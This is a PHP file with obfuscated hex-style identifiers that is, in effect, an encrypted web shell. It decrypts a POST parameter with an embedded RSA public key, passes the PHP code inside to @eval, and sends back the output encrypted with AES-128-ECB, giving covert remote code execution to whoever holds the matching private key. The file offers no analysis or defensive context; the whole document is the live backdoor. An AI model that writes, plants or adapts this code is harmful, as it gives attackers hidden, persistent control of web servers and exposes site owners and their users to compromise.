<?php
class fb987bd3bc0840ada85fd36dd4338294 {
    private static $aca11e79fdf04980aedcc1802f8e900b= '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl0IgFrz+OHJn0xBLs+Z8
A8tRwSv7AxNJCa43/jRbcO7cjgP2jm0WH2yYuhVFX011AUYOE8ijzh/VJea4YPRP
5yukTNJC4t4cDvdGg4AL+6NvGipMGDWDaEy/tT7RTDBXyMp+JbVed4npo3AwW5Hw
ODbF7+f9OCdBlFYYLOafsYN0fk2AD32RmtgekkCJrvN+RBUSCioULPm0I5UYJ2x2
U2DH1Qt8Ng2+XacPvhezCXWIvcEf22tISvzQaBs+rtzoSNFNMQr31/C5W5iVNmcv
zhamXSxk20NemfHgbd33vkSvQeVCTEheV2Np54GjfctLWZNz9uKkNgDaUcov58jb
2wIDAQAB
-----END PUBLIC KEY-----';
    private $p7570c7210d54c14a1a26507dc16252c = 256;
    private static function d99dfac3360f4d9d9d0e367ccb896501()
    {
        $func_1 = "openssl";
        $func_2 = "pkey";
        $func_3 = "get";
        $func_4 = "public";
        $a64644df2c8c409ba72318ecec6d4188 = self::$aca11e79fdf04980aedcc1802f8e900b;
        $all_func = $func_1."_".$func_2."_".$func_3."_"."_".$func_4."()";
        return openssl_pkey_get_public($a64644df2c8c409ba72318ecec6d4188);
    }

    public  function i0c07bd5e179404ca7ea96560d7a06aa($encrypted)
    {
        if (!is_string($encrypted)) {
            return null;
        }

        $b8fca5be279b45c3af7f5c694aaa087b = '';
        $ee4a3caac4d2455fa946902b7065fdf0 = str_split(base64_decode($encrypted), $this->p7570c7210d54c14a1a26507dc16252c);
        foreach ($ee4a3caac4d2455fa946902b7065fdf0 as $ff070dea3adf46e8a7e9d5211ee2a899) {
            openssl_public_decrypt($ff070dea3adf46e8a7e9d5211ee2a899, $db169d47538c4b13841fe5559a48a11e, self::d99dfac3360f4d9d9d0e367ccb896501());
            $b8fca5be279b45c3af7f5c694aaa087b .= $db169d47538c4b13841fe5559a48a11e;
        }
        return $b8fca5be279b45c3af7f5c694aaa087b ? $b8fca5be279b45c3af7f5c694aaa087b : null;

    }
}

class g5436d4548bd424795b623c834b81a25{
    var $oc3e2cd8c0d34d119ba9b86b70a26449;

    function __construct($f6301b25e7e34428ab0300f7b57b63ca){
        $this->oc3e2cd8c0d34d119ba9b86b70a26449 = $f6301b25e7e34428ab0300f7b57b63ca;
    }

    public  function e9eb40191ca047cda581ad417b2a357a($a761b7eed1b9418fa77c178d7bbc25ff)
    {

        if (!is_string($a761b7eed1b9418fa77c178d7bbc25ff)) {
            return null;
        }
        $e59f24fc09ec4be2800e340ed8b873c5 = openssl_encrypt($a761b7eed1b9418fa77c178d7bbc25ff, 'AES-128-ECB', $this->oc3e2cd8c0d34d119ba9b86b70a26449, 0);
        return $e59f24fc09ec4be2800e340ed8b873c5;
    }

}




if(isset($_POST['f88a1636b885442c9debb25e2399eaa3'])){
    $f241ae1cdfed4302a816e1abe1e9b414 = new fb987bd3bc0840ada85fd36dd4338294();
    $f39ae9543c4b4a1bb0002d71cd174fbd = json_decode($f241ae1cdfed4302a816e1abe1e9b414->i0c07bd5e179404ca7ea96560d7a06aa($_POST['f88a1636b885442c9debb25e2399eaa3']), true);
    $af2afb82632b49e1986e6c02b7738be0 = $f39ae9543c4b4a1bb0002d71cd174fbd['46d29d717ff140f88188ce92cc45d497'];
    $ae42ed6cb32445bbb222a9ecfd414404 = $f39ae9543c4b4a1bb0002d71cd174fbd['bcb408560553405e8064f3bd16ebfae1'];
    $ab27b0c18aa2405eb5cdc9e67ecd8964 = new g5436d4548bd424795b623c834b81a25($ae42ed6cb32445bbb222a9ecfd414404);
    ob_start();
    try {
        @eval($af2afb82632b49e1986e6c02b7738be0);
    }catch(Exception $e){

        throw new Exception();
    }
    $res = ob_get_clean();
    $e49fa27a4c284a1eab549de144b44f1b = $ab27b0c18aa2405eb5cdc9e67ecd8964->e9eb40191ca047cda581ad417b2a357a($res);
    echo $e49fa27a4c284a1eab549de144b44f1b;
}
